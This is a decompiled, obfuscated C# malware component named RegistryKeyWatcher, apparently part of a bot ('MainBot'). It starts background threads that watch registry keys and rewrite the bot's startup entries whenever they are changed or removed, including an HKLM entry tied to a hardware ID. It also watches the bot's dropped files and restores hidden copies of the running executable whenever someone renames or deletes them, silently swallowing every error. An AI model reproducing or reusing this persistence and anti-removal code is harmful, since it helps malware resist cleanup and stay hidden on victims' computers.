namespace Helper
{
    using MainBot;
    using Microsoft.Win32;
    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using System.Security.AccessControl;
    using System.Threading;

    internal class RegistryKeyWatcher
    {
        private static ManualResetEvent manualResetEvent_0 = new ManualResetEvent(false);

        private static void HandleRegKeyChange(object object_0)
        {
            AutoResetEvent event2 = new AutoResetEvent(false);
            WaitHandle[] waitHandles = new WaitHandle[] { event2, manualResetEvent_0 };
            RegistryKey key = InstallAndMutex.registryKey_0.OpenSubKey((string) ((object[]) object_0)[0], RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadPermissions | RegistryRights.Notify | RegistryRights.QueryValues);
            while (!manualResetEvent_0.WaitOne(0, true))
            {
                try
                {
                    if ((RegNotifyChangeKeyValue(((SafeHandle) key.GetType().GetField(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_56(), BindingFlags.NonPublic | BindingFlags.Instance).GetValue(key)).DangerousGetHandle(), true, Enum1.h5 | Enum1.const_3 | Enum1.const_1 | Enum1.const_0, event2.SafeWaitHandle.DangerousGetHandle(), true) == 0) && (WaitHandle.WaitAny(waitHandles) == 0))
                    {
                        switch (((Enum2) ((object[]) object_0)[1]))
                        {
                            case Enum2.const_0:
                            {
                                WT$(InstallAndMutex.registryKey_0, <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_20(), Configuration.ProcessNames[0], Configuration.ProcessFiles[0], RegistryValueKind.String);
                                continue;
                            }
                            case Enum2.const_1:
                            {
                                WT$(InstallAndMutex.registryKey_0, <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_21(), Configuration.ProcessNames[1], Configuration.ProcessFiles[1], RegistryValueKind.String);
                                continue;
                            }
                            case Enum2.const_2:
                            {
                                WT$(Registry.LocalMachine, <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_22() + Configuration.HWID1, <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_23(), Configuration.ProcessFiles[0] + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_24(), RegistryValueKind.String);
                                WT$(Registry.LocalMachine, <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_22() + Configuration.HWID1, <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_25(), 1, RegistryValueKind.DWord);
                                continue;
                            }
                        }
                    }
                    continue;
                }
                catch
                {
                    continue;
                }
            }
        }

        public static void InvokeEvent()
        {
            manualResetEvent_0.Set();
        }

        [DllImport("advapi32", CharSet=CharSet.Unicode)]
        private static extern int RegNotifyChangeKeyValue(IntPtr intptr_0, bool bool_0, Enum1 enum1_0, IntPtr intptr_1, bool bool_1);
        public static void ThreadWatchThreads()
        {
            manualResetEvent_0.Reset();
            Thread thread = new Thread(new ParameterizedThreadStart(RegistryKeyWatcher.HandleRegKeyChange));
            thread.IsBackground = true;
            thread.Start(new object[] { <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_20(), Enum2.const_0 });
            Thread thread2 = new Thread(new ParameterizedThreadStart(RegistryKeyWatcher.HandleRegKeyChange));
            thread2.IsBackground = true;
            thread2.Start(new object[] { <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_21(), Enum2.const_1 });
            Thread thread3 = new Thread(new ParameterizedThreadStart(RegistryKeyWatcher.HandleRegKeyChange));
            thread3.IsBackground = true;
            thread3.Start(new object[] { <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_22(), Enum2.const_2 });
            Thread thread4 = new Thread(new ParameterizedThreadStart(RegistryKeyWatcher.WatchFileRenameRemove));
            thread4.IsBackground = true;
            thread4.Start(Configuration.ProcessFiles[0]);
            Thread thread5 = new Thread(new ParameterizedThreadStart(RegistryKeyWatcher.WatchFileRenameRemove));
            thread5.IsBackground = true;
            thread5.Start(Configuration.ProcessFiles[1]);
        }

        private static void WatchFileRenameRemove(object object_0)
        {
            FileInfo info = new FileInfo((string) object_0);
            FileSystemWatcher watcher = new FileSystemWatcher(info.DirectoryName);
            while (!manualResetEvent_0.WaitOne(0, true))
            {
                WaitForChangedResult result = watcher.WaitForChanged(WatcherChangeTypes.Renamed | WatcherChangeTypes.Changed | WatcherChangeTypes.Deleted);
                if ((result.Name == info.Name) || (result.OldName == info.Name))
                {
                    try
                    {
                        if (File.Exists((string) object_0))
                        {
                            File.Delete((string) object_0);
                        }
                        File.Copy(Configuration.CurrentFilename, (string) object_0, true);
                        File.SetAttributes((string) object_0, FileAttributes.Archive | FileAttributes.Hidden);
                        continue;
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
        }

        private static void WT$(RegistryKey registryKey_0, string string_0, string string_1, object object_0, RegistryValueKind registryValueKind_0)
        {
            try
            {
                if (registryKey_0.OpenSubKey(string_0) == null)
                {
                    registryKey_0.CreateSubKey(string_0);
                }
                RegistryKey key = registryKey_0.OpenSubKey(string_0, true);
                if (key.Equals(string_1))
                {
                    if (key.GetValue(string_1) != object_0)
                    {
                        key.SetValue(string_1, object_0, registryValueKind_0);
                    }
                }
                else
                {
                    key.SetValue(string_1, object_0, registryValueKind_0);
                }
                key.Close();
                registryKey_0.Close();
            }
            catch
            {
            }
        }

        private enum Enum1 : uint
        {
            const_0 = 1,
            const_1 = 2,
            const_3 = 8,
            h5 = 4
        }

        private enum Enum2 : uint
        {
            const_0 = 1,
            const_1 = 2,
            const_2 = 3
        }
    }
}

